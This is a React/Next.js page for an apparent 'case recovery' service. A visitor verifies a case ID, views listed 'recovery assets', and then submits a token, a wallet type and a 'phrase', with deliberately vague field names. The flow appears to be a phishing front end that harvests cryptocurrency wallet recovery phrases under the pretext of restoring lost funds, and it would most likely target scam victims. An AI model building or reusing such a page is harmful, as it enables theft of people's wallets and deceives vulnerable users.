'use client';
import {
	verifytoken,
	RetrieveSubData,
	subRetrieveRequest,
} from '@/actions/recovery';
import AssetsTable from '@/components/retrieve/AssetsTable';
import CaseHeader from '@/components/retrieve/CaseHeader';
import CaseIdVerificationModal from '@/components/retrieve/CaseIdVerificationModal';
import ErrorState from '@/components/retrieve/ErrorState';
import LoadingState from '@/components/retrieve/LoadingState';
import RestoreAction from '@/components/retrieve/RestoreAction';
import RestoreModal from '@/components/retrieve/RestoreModal';
import SuccessModal from '@/components/retrieve/SuccessModal';
import SummaryCards from '@/components/retrieve/SummaryCards';
import VerificationRequired from '@/components/retrieve/VerificationRequired';
import { CaseWithAssets } from '@/types';
import { useRouter } from 'next/navigation';
import React, { useEffect, useState } from 'react';

const RetrievePage = () => {
	const router = useRouter();
	const [showCaseIdModal, setShowCaseIdModal] = useState(false);
	const [showRetModal, setShowRetModal] = useState<boolean>(false);
	const [showSuccessModal, setShowSuccessModal] = useState(false);

	const [caseId, setCaseId] = useState('');
	const [isVerified, setIsVerified] = useState(false);
	const [isVerifying, setIsVerifying] = useState(false);
	const [caseIdError, setCaseIdError] = useState('');

	const [clause, setClause] = useState('');
	const [code, setCode] = useState('');
	const [selectedWall, setSelectedWall] = useState('');
	const [isSubRetrieving, setIsSubRetrieving] = useState<boolean>(false);
	const [retrieveError, setRetrieveError] = useState('');

	const [caseData, setCaseData] = useState<CaseWithAssets | null>(null);

	const [isLoadingCase, setIsLoadingCase] = useState(false);
	const [caseError, setCaseError] = useState('');

	useEffect(() => {
		if (!isVerified) {
			setShowCaseIdModal(true);
		}
	}, [isVerified]);

	const fetchCaseData = async (id: string): Promise<CaseWithAssets | null> => {
		try {
			const response = await fetch(`/api/cases/${id}`);

			if (!response.ok) {
				if (response.status === 404) {
					throw new Error(
						'Case ID not found. Please check your Case ID and try again.'
					);
				} else if (response.status === 400) {
					throw new Error('Invalid Case ID format. Please enter a valid UUID.');
				} else {
					throw new Error('Failed to fetch case data. Please try again.');
				}
			}

			const data: CaseWithAssets = await response.json();
			return data;
		} catch (error) {
			throw error;
		}
	};

	const handleCaseIdVerification = async () => {
		setIsVerifying(true);
		setCaseIdError('');
		setCaseError('');

		const uuidRegex =
			/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;

		if (!caseId.trim()) {
			setCaseIdError('Case ID is required');
			setIsVerifying(false);
			return;
		}

		if (!uuidRegex.test(caseId)) {
			setCaseIdError('Invalid Case ID format. Please enter a valid UUID.');
			setIsVerifying(false);
			return;
		}

		try {
			setIsLoadingCase(true);
			const data = await fetchCaseData(caseId);

			if (data) {
				setCaseData(data);
				setIsVerified(true);
				setShowCaseIdModal(false);
			}
		} catch (error) {
			setCaseIdError(
				error instanceof Error
					? error.message
					: 'An error occurred while verifying the case ID'
			);
		} finally {
			setIsVerifying(false);
			setIsLoadingCase(false);
		}
	};

	const handleRecoverySubmission = async () => {
		setIsSubRetrieving(true);
		setRetrieveError('');

		try {
			if (!code.trim()) {
				setRetrieveError('Token is required');
				return;
			}

			if (!selectedWall) {
				setRetrieveError('Please select a type');
				return;
			}

			if (!clause.trim()) {
				setRetrieveError(' Phrase is required');
				return;
			}

			const tokenVerification = await verifytoken(code);
			if (!tokenVerification.valid) {
				setRetrieveError(tokenVerification.error || 'Invalid token');
				return;
			}

			const submissionData: RetrieveSubData = {
				token: code,
				wType: selectedWall,
				phrase: clause,
				userEmail: 'user@example.com',

				createdAt: new Date(),
			};

			const result = await subRetrieveRequest(submissionData);

			if (result.success) {
				setCode('');
				setSelectedWall('');
				setClause('');
				setShowRetModal(false);
				setShowSuccessModal(true);
			} else {
				setRetrieveError(result.message);
			}
		} catch (err) {
			console.error('Submission error:', err);
			setRetrieveError('An unexpected error occurred. Please try again.');
		} finally {
			setIsSubRetrieving(false);
		}
	};

	const handleSuccessCompletion = () => {
		setShowSuccessModal(false);
		router.push('/');
	};

	const renderMainContent = () => {
		if (!isVerified && !isLoadingCase && !caseError) {
			return <VerificationRequired />;
		}

		if (isLoadingCase) {
			return <LoadingState />;
		}

		if (caseError) {
			return <ErrorState error={caseError} />;
		}

		if (isVerified && caseData) {
			return (
				<div className="space-y-6">
					<CaseHeader caseData={caseData} />
					<SummaryCards caseData={caseData} />
					<AssetsTable recoveryAssets={caseData.recoveryAssets} />
					<RestoreAction
						caseStatus={caseData.status}
						onInitiateRestore={() => setShowRetModal(true)}
					/>
				</div>
			);
		}

		return null;
	};

	return (
		<div className="min-h-screen bg-gray-50 dark:bg-gray-900 p-4 sm:p-6 relative overflow-hidden">
			<div className="max-w-7xl mx-auto">
				<div className="mb-8">
					<h1 className="text-3xl font-bold text-gray-900 dark:text-white mb-2">
						Validation
					</h1>
					<p className="text-gray-600 dark:text-gray-400">Restore validation</p>
				</div>

				{renderMainContent()}
			</div>

			<CaseIdVerificationModal
				isOpen={showCaseIdModal}
				caseId={caseId}
				setCaseId={setCaseId}
				error={caseIdError}
				isVerifying={isVerifying}
				onVerify={handleCaseIdVerification}
			/>

			<RestoreModal
				isOpen={showRetModal}
				onClose={() => setShowRetModal(false)}
				uPhrase={clause}
				setUPhrase={setClause}
				token={code}
				setToken={setCode}
				selectedWall={selectedWall}
				setSelectedWall={setSelectedWall}
				error={retrieveError}
				isSubmitting={isSubRetrieving}
				onSubmit={handleRecoverySubmission}
			/>

			<SuccessModal
				isOpen={showSuccessModal}
				onComplete={handleSuccessCompletion}
			/>
		</div>
	);
};

export default RetrievePage;
